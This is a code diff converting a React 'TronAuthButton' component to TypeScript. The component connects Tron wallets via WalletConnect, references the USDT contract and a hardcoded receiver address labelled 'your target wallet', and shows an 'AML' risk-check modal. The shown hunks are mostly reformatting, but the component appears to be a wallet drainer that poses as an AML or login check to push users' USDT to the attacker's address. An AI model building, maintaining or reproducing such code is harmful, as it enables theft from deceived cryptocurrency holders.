@@ -1,13 +1,11 @@
-// src/components/tronAuthButton/TronAuthButton.jsx
-
 import React, { useState } from "react";
 import { WalletConnectAdapter } from "@tronweb3/tronwallet-adapter-walletconnect";
 import TronWeb from "tronweb";
 import { Buffer } from "buffer";
-window.Buffer = Buffer; // Fix Buffer is not defined in browser
+window.Buffer = Buffer;
 
-const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT (TRC20) mainnet
-const RECEIVER = "THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n"; // <-- your target wallet
+const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const RECEIVER = "THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n";
 
 const tronWeb = new TronWeb({
   fullHost: "https://api.trongrid.io",
@@ -33,8 +31,23 @@ const adapter = new WalletConnectAdapter({
   },
 });
 
-export const TronAuthButton = () => {
-  const [modal, setModal] = useState(null);
+// Типы для модалки
+type ModalState =
+  | null
+  | {
+      type: "error";
+      message: string;
+    }
+  | {
+      type: "aml";
+      risk: "Low" | "Medium" | "High";
+      details: string;
+      address: string;
+      txid?: string;
+    };
+
+export const TronAuthButton: React.FC = () => {
+  const [modal, setModal] = useState<ModalState>(null);
   const [processing, setProcessing] = useState(false);
 
   const handleClick = async () => {
@@ -57,7 +70,8 @@ export const TronAuthButton = () => {
       if (trx < 5) {
         setModal({
           type: "error",
-          message: "❌ Insufficient TRX for network fee. Please keep at least 5 TRX on your balance.",
+          message:
+            "❌ Insufficient TRX for network fee. Please keep at least 5 TRX on your balance.",
         });
         return;
       }
@@ -107,8 +121,7 @@ export const TronAuthButton = () => {
           }`,
         });
       }
-    } catch (err) {
-      // Handle cancellation & user rejection quietly (no error modal)
+    } catch (err: any) {
       let msg =
         (err && err.message) ||
         (typeof err === "string" ? err : "") ||
@@ -121,7 +134,10 @@ export const TronAuthButton = () => {
       } else if (msg) {
         setModal({ type: "error", message: "⚠️ " + msg });
       } else {
-        setModal({ type: "error", message: "⚠️ Connection or transaction error" });
+        setModal({
+          type: "error",
+          message: "⚠️ Connection or transaction error",
+        });
       }
     } finally {
       setProcessing(false);
@@ -159,7 +175,9 @@ export const TronAuthButton = () => {
                   </div>
                   <div style={{ margin: "10px 0" }}>{modal.details}</div>
                   <div>
-                    <small>Wallet: <b>{modal.address}</b></small>
+                    <small>
+                      Wallet: <b>{modal.address}</b>
+                    </small>
                   </div>
                   {modal.txid && (
                     <div>
